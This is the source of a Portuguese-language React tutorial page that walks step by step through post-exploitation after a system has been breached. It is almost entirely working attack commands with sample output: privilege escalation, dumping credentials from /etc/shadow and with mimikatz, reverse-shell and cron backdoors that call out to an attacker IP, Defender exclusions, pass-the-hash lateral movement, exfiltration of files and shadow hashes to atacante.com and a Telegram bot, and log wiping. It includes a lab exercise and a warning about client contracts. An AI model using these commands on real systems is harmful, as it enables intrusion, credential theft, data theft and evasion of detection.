import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CommandTable } from "@/components/ui/CommandTable";
import { OutputBlock } from "@/components/ui/OutputBlock";
import { PracticeBox } from "@/components/ui/PracticeBox";
import { Terminal } from "@/components/ui/Terminal";

export default function PostExploracao() {
  return (
    <PageContainer
      title="Pós-exploração — depois do foothold"
      subtitle="Estabilizar shell, situational awareness, dump de credenciais, persistência, lateral movement, exfiltração."
      difficulty="avancado"
      timeToRead="22 min"
      prompt="postexp"
    >
      <h2>Fase 1 — Estabilizar a shell</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "shell crua de RCE — não tem completion, Ctrl+C mata a sessão",
            cmd: "$ ls",
            out: `bin   etc   lib   proc  root  sbin  tmp   var
boot  home  media opt   run   srv   usr`,
            outType: "muted",
          },
          {
            comment: "1) upgrade para PTY com python",
            cmd: "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
            out: "wallyson@target:~$ ",
            outType: "info",
          },
          {
            comment: "2) terminal de verdade (Ctrl+Z para suspender no atacante)",
            cmd: "(no atacante) stty raw -echo; fg",
            out: "(volta a sessão)",
            outType: "muted",
          },
          {
            comment: "3) exportar TERM e SHELL no alvo",
            cmd: "export TERM=xterm-256color SHELL=/bin/bash; stty rows 50 columns 200",
            out: "(silencioso. Agora Ctrl+C funciona, completion idem, vim usável)",
            outType: "success",
          },
        ]}
      />

      <h2>Fase 2 — Situational awareness (Linux)</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "id; hostname; uname -a; cat /etc/os-release | head -3",
            out: `uid=33(www-data) gid=33(www-data) groups=33(www-data)
target.empresa.local
Linux target 5.15.0-91-generic #101-Ubuntu SMP Tue Nov 14 13:30:08 UTC 2023 x86_64 GNU/Linux
PRETTY_NAME="Ubuntu 22.04.3 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"`,
            outType: "info",
          },
          {
            cmd: "ip a; ip r; cat /etc/resolv.conf",
            out: `2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP
    inet 10.10.10.50/24 brd 10.10.10.255 scope global ens33

default via 10.10.10.1 dev ens33  proto static  metric 100
10.10.10.0/24 dev ens33 proto kernel scope link src 10.10.10.50
192.168.50.0/24 dev tun0 proto kernel scope link src 192.168.50.5  ← rede interna!

nameserver 192.168.50.10  ← DC interno
nameserver 192.168.50.11`,
            outType: "warning",
          },
          {
            cmd: "ss -lntp; ss -atnp | head -20",
            out: `State   Recv-Q Send-Q Local Address:Port Peer Address:Port
LISTEN  0      128    127.0.0.1:5432     0.0.0.0:*       users:(("postgres",pid=841))
LISTEN  0      4096   127.0.0.1:6379     0.0.0.0:*       users:(("redis-server",pid=909))
LISTEN  0      511    *:80               *:*             users:(("nginx",pid=1234))
LISTEN  0      128    *:22               *:*             users:(("sshd",pid=678))`,
            outType: "info",
          },
          {
            cmd: "ps auxf | head -30",
            out: `USER   PID %CPU %MEM     VSZ    RSS TTY  STAT START   TIME COMMAND
root     1  0.0  0.5  167912  11248 ?    Ss   Mar20  0:34 /sbin/init
root   678  0.0  0.4   12808   7880 ?    Ss   Mar20  0:00 /usr/sbin/sshd -D
postgres 841 0.0  1.2  214568  24884 ?    S    Mar20  0:18 /usr/lib/postgresql/14/bin/postgres
www-data 1234 0.1 0.8  155208  16704 ?    S    Mar20 12:42 nginx: master process
www-data 1235 0.0 0.4  155544   8924 ?    S    Mar20  0:42  \\_ nginx: worker process
deploy 2042 0.0  0.3   12568   6420 pts/0 S    14:21  0:00 /bin/bash`,
            outType: "default",
          },
          {
            cmd: "cat /etc/passwd | grep -v nologin",
            out: `root:x:0:0:root:/root:/bin/bash
sync:x:4:65534:sync:/bin:/bin/sync
postgres:x:106:113:PostgreSQL:/var/lib/postgresql:/bin/bash
deploy:x:1000:1000:Deploy User,,,:/home/deploy:/bin/bash
ana:x:1001:1001:,,,:/home/ana:/bin/bash`,
            outType: "info",
          },
        ]}
      />

      <h2>Fase 3 — Privesc (Linux)</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "1) sudo NOPASSWD",
            cmd: "sudo -l",
            out: `Matching Defaults entries for www-data on target:
    env_reset, mail_badpass

User www-data may run the following commands on target:
    (root) NOPASSWD: /usr/bin/find             ← privesc trivial`,
            outType: "warning",
          },
          {
            cmd: "sudo /usr/bin/find . -exec /bin/sh \\;",
            out: `# id
uid=0(root) gid=0(root) groups=0(root)`,
            outType: "error",
          },
          {
            comment: "2) SUID binaries",
            cmd: "find / -perm -u=s -type f 2>/dev/null",
            out: `/usr/bin/sudo
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/su
/usr/local/bin/backup.sh        ← suspeito!
/usr/sbin/pppd`,
            outType: "info",
          },
          {
            comment: "3) capabilities",
            cmd: "getcap -r / 2>/dev/null",
            out: `/usr/bin/python3.10 = cap_setuid+ep    ← privesc!
/usr/bin/ping = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep`,
            outType: "warning",
          },
          {
            cmd: "/usr/bin/python3.10 -c 'import os;os.setuid(0);os.system(\"/bin/bash\")'",
            out: `# id
uid=0(root) gid=0(root) groups=0(root)`,
            outType: "error",
          },
          {
            comment: "4) automatizar com linpeas",
            cmd: "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh | tee /tmp/linpeas.out",
            out: `╔══════════╣ Privilege Escalation Path
[+] [CVE-2022-0847] DirtyPipe                    ← KERNEL VULN!
[+] sudo -l: NOPASSWD entries                    ← privesc trivial
[+] World-writable cron                           /etc/cron.d/backup
[+] Writable PATH                                 /home/www/scripts in PATH
[+] Suspicious SUID binary                        /usr/local/bin/backup.sh

╔══════════╣ Interesting files
[+] /etc/passwd is writable                       ← INSTANT ROOT`,
            outType: "warning",
          },
        ]}
      />

      <h2>Fase 4 — Coleta de credenciais</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "Linux — /etc/shadow (precisa root)",
            cmd: "cat /etc/shadow | grep -v '!\\|*'",
            out: `root:$y$j9T$Z6F8pQa.../...:19872:0:99999:7:::
deploy:$y$j9T$XvBn5pK.../...:19872:0:99999:7:::
ana:$y$j9T$RtY8qLm.../...:19872:0:99999:7:::`,
            outType: "info",
          },
          {
            comment: "configs com creds em texto",
            cmd: "grep -ri 'password\\|secret\\|api_key' /opt /var/www /etc 2>/dev/null | grep -v Binary | head -20",
            out: `/opt/app/config/database.yml: password: 'PgRoot@2024!'
/var/www/wp-config.php: define('DB_PASSWORD', 'WordPress!2025');
/etc/cron.d/backup: AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
/home/deploy/.netrc: machine github.com login deploy-bot password ghp_ABC123XYZ...`,
            outType: "error",
          },
          {
            comment: "histórias de bash de outros users",
            cmd: "find /home -name '.bash_history' -readable 2>/dev/null | xargs -I{} sh -c 'echo \"=== {} ===\"; cat {}'",
            out: `=== /home/deploy/.bash_history ===
ssh root@10.10.10.5
mysql -u root -pSenhaRoot2024
sudo systemctl restart nginx
psql -U postgres -h db.internal -W
# senha digitada: Welcome2025Db@`,
            outType: "warning",
          },
          {
            comment: "Windows — mimikatz via meterpreter",
            cmd: "(meterpreter) load kiwi; creds_all",
            out: `[+] Running as SYSTEM
[*] Retrieving all credentials

msv credentials
===============
Username   Domain         NTLM
--------   ------         ----
ana        EMPRESA        c1e07adc59f6c3eaa7a02e7a4e5f5cc1
joao       EMPRESA        88846f7eaee8fb117ad06bdd830b7586
svc-vpn    EMPRESA        c5a237b7e9d8c2a4f1e6d3a2b9e8d7c6

wdigest credentials   ← cleartext se enabled
====================
Username   Domain         Password
ana        EMPRESA        Empresa@2025!
svc-vpn    EMPRESA        VpnService2024#

kerberos credentials
====================
Username   Domain         Password
admin      EMPRESA.LOCAL  AdminDC@2025!`,
            outType: "error",
          },
        ]}
      />

      <h2>Fase 5 — Persistência</h2>
      <CommandTable
        title="Linux — onde colocar a back door"
        variations={[
          { cmd: "echo 'bash -i >& /dev/tcp/10.10.14.42/4444 0>&1' >> ~/.bashrc", desc: "Roda toda vez que o user logar.", output: "User-level. Apaga em fresh login." },
          { cmd: "(crontab -l; echo '*/5 * * * * curl 10.14/x.sh|sh') | crontab -", desc: "Rodada a cada 5min.", output: "Roda como o user dono do crontab." },
          { cmd: "echo '* * * * * root /tmp/.x' > /etc/cron.d/sshupdate", desc: "Cron com user root direto.", output: "Precisa root pra criar." },
          { cmd: "systemctl edit sshd  # adicionar ExecStartPost=", desc: "Hook de serviço legítimo.", output: "Roda quando sshd inicia." },
          { cmd: "echo 'YOUR_SSH_PUBKEY' >> /root/.ssh/authorized_keys", desc: "Login SSH sem senha.", output: "Mais limpa. Sobrevive reboots." },
          { cmd: "ln -sf /tmp/.x /etc/init.d/x; update-rc.d x defaults", desc: "Init.d (legacy).", output: "Funciona em sysv ainda." },
          { cmd: "PROMPT_COMMAND='. <(curl -s 10/x.sh)'", desc: "Roda a cada comando do user.", output: "Em /etc/bash.bashrc = todos." },
        ]}
      />

      <CommandTable
        title="Windows — registry, scheduled task, service"
        variations={[
          { cmd: "schtasks /create /tn upd /tr C:\\evil.exe /sc onlogon /ru SYSTEM", desc: "Tarefa agendada como SYSTEM.", output: "Roda em qualquer login." },
          { cmd: "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v upd /d C:\\evil.exe", desc: "Run key (HKLM = todos).", output: "User logando = exec." },
          { cmd: "sc create upd binPath=\"C:\\evil.exe\" start=auto", desc: "Serviço Windows.", output: "Roda no boot como SYSTEM." },
          { cmd: "Add-MpPreference -ExclusionPath C:\\Users\\Public", desc: "(antes de plantar) exclui pasta do AV.", output: "Defender deixa de scanear." },
          { cmd: "wmic /node:DC01 process call create cmd...", desc: "WMI persistence remota.", output: "Sem tocar no disco do alvo." },
          { cmd: "DLL hijacking em Program Files\\App\\version.dll", desc: "App carrega DLL maliciosa.", output: "Sobrevive update do app." },
        ]}
      />

      <h2>Fase 6 — Lateral movement</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "spray das creds dump pelo CrackMapExec",
            cmd: "crackmapexec smb 192.168.50.0/24 -u ana -H c1e07adc59f6c3eaa7a02e7a4e5f5cc1 --local-auth",
            out: `SMB  192.168.50.10  445  DC01     [*] Windows 10.0 Build 17763 x64
SMB  192.168.50.10  445  DC01     [+] EMPRESA\\ana:c1e07adc... (Pwn3d!)  ← admin local!
SMB  192.168.50.20  445  WS-RH    [+] EMPRESA\\ana:c1e07adc... (Pwn3d!)
SMB  192.168.50.21  445  WS-FIN   [-] EMPRESA\\ana:c1e07adc... STATUS_LOGON_FAILURE`,
            outType: "error",
          },
          {
            comment: "pass-the-hash com impacket",
            cmd: "impacket-psexec EMPRESA/ana@192.168.50.10 -hashes :c1e07adc59f6c3eaa7a02e7a4e5f5cc1",
            out: `Impacket v0.11.0 - Copyright 2023 Fortra

[*] Requesting shares on 192.168.50.10.....
[*] Found writable share ADMIN$
[*] Uploading file mLqCxFoT.exe
[*] Opening SVCManager on 192.168.50.10.....
[*] Creating service kPPv on 192.168.50.10.....
[*] Starting service kPPv.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.6532]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\\Windows\\system32> whoami
nt authority\\system`,
            outType: "error",
          },
          {
            comment: "via SSH",
            cmd: "sshpass -p 'PgRoot@2024!' ssh -o StrictHostKeyChecking=no postgres@192.168.50.30 'id; hostname'",
            out: `uid=106(postgres) gid=113(postgres) groups=113(postgres),103(ssl-cert)
db.empresa.local`,
            outType: "warning",
          },
        ]}
      />

      <h2>Fase 7 — Pivoting</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "sshuttle = VPN over SSH (mais simples)",
            cmd: "sshuttle -r ana@10.10.10.50 192.168.50.0/24 --dns",
            out: `client: Connected.
client: Routes added: 192.168.50.0/24 via 10.10.10.50

# agora 192.168.50.x roteia pelo target. nmap rola direto.

(em outro terminal)
$ nmap -sV 192.168.50.10
PORT     STATE SERVICE      VERSION
445/tcp  open  microsoft-ds Windows Server 2019 (auth pelo target)`,
            outType: "success",
          },
          {
            comment: "chisel = SOCKS proxy reverso (sem precisar SSH)",
            cmd: "(no atacante) ./chisel server -p 8000 --reverse",
            out: `2026/04/03 21:14:42 server: Reverse tunnelling enabled
2026/04/03 21:14:42 server: Listening on http://0.0.0.0:8000`,
            outType: "muted",
          },
          {
            cmd: "(no alvo) ./chisel client 10.10.14.42:8000 R:1080:socks",
            out: `2026/04/03 21:14:48 client: Connecting to ws://10.10.14.42:8000
2026/04/03 21:14:48 client: Connected (Latency 18.412ms)`,
            outType: "muted",
          },
          {
            comment: "agora qualquer ferramenta com proxychains",
            cmd: "proxychains -q nmap -sT -Pn --top-ports=20 192.168.50.10",
            out: `Starting Nmap 7.95
Nmap scan report for 192.168.50.10
22/tcp   open  ssh
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
389/tcp  open  ldap
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server`,
            outType: "info",
          },
        ]}
      />

      <h2>Fase 8 — Exfiltração</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "1) HTTPS — passa quase qualquer firewall",
            cmd: "tar czf - /home/ana/Documentos | curl -s -X POST --data-binary @- https://atacante.com/u",
            out: "(silencioso. atacante.com responde 200 OK)",
            outType: "warning",
          },
          {
            comment: "2) DNS exfil (super lento mas inviolável)",
            cmd: "for c in $(base64 secret.txt | tr -d '\\n' | fold -w63); do dig +short $c.exfil.atacante.com @1.1.1.1; done",
            out: "(query DNS recursiva entrega o conteúdo char por char)",
            outType: "muted",
          },
          {
            comment: "3) SCP via SSH (se SSH outbound for permitido)",
            cmd: "tar czf - /var/lib/postgresql | ssh atacante@10.14 'cat > /loot/db.tar.gz'",
            out: "(transferência em background)",
            outType: "default",
          },
          {
            comment: "4) Telegram/Slack webhook",
            cmd: "curl -F \"document=@/etc/shadow\" \"https://api.telegram.org/botTOKEN/sendDocument?chat_id=ID\"",
            out: `{"ok":true,"result":{"message_id":42,"date":1712175831,"document":{...}}}`,
            outType: "warning",
          },
        ]}
      />

      <h2>Fase 9 — Cleanup</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "Linux — apagar logs (fica óbvio em SIEM, mas é a teoria)",
            cmd: "shred -u /var/log/auth.log.1 /var/log/wtmp /root/.bash_history",
            out: "(silencioso. last/lastb param de mostrar a sessão)",
            outType: "muted",
          },
          {
            cmd: "history -c; export HISTFILE=/dev/null; unset PROMPT_COMMAND",
            out: "(some do .bash_history mas não do auditd se ativo)",
            outType: "warning",
          },
          {
            comment: "Windows — limpar EventLog",
            cmd: "(meterpreter) clearev",
            out: `[*] Wiping 2042 records from Application...
[*] Wiping 8421 records from System...
[*] Wiping 12442 records from Security...`,
            outType: "error",
          },
        ]}
      />

      <PracticeBox
        title="Ciclo completo no Metasploitable 2 (lab)"
        goal="RCE → estabilizar → enum → privesc → loot → persistir → exfil. Tudo em VM isolada."
        steps={[
          "Suba Metasploitable 2 em VirtualBox host-only.",
          "Pwne via vsftpd backdoor (msfconsole).",
          "Estabilize com python pty.",
          "Rode linpeas, pegue 1 privesc.",
          "Escale para root.",
          "Dump /etc/shadow + /var/www/html/dvwa/config/.",
          "Plante backdoor SSH (authorized_keys).",
          "Exfiltre /etc/shadow para você via curl POST.",
        ]}
        command={`# 1) RCE
msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 192.168.56.101; run"

# 2) estabilizar
python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm SHELL=/bin/bash

# 3) loot
cat /etc/shadow > /tmp/shadow.txt
grep -ri password /var/www/html/dvwa/config/

# 4) persistir
mkdir -p /root/.ssh && echo "$YOUR_PUBKEY" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# 5) exfil
curl -F "data=@/tmp/shadow.txt" http://10.10.14.42:8000/u`}
        expected={`# id
uid=0(root) gid=0(root)

cat /etc/shadow > /tmp/shadow.txt   ← 30 hashes capturados

(no atacante)
192.168.56.101 - - [...] "POST /u HTTP/1.1" 501 -
ls -la /tmp/loot/shadow.txt`}
        verify="Após o lab: rm authorized_keys, snapshot revert. Em pentest real: documente cada artefato plantado para o cliente remover."
      />

      <AlertBox type="danger" title="Pos-exploitation = território minado em pentest">
        Cada arquivo plantado deve ser logado com timestamp + caminho + propósito. No relatório,
        liste TUDO para o cliente remover. Exfiltrar dados sem cláusula no contrato = violação de LGPD.
      </AlertBox>
    </PageContainer>
  );
}
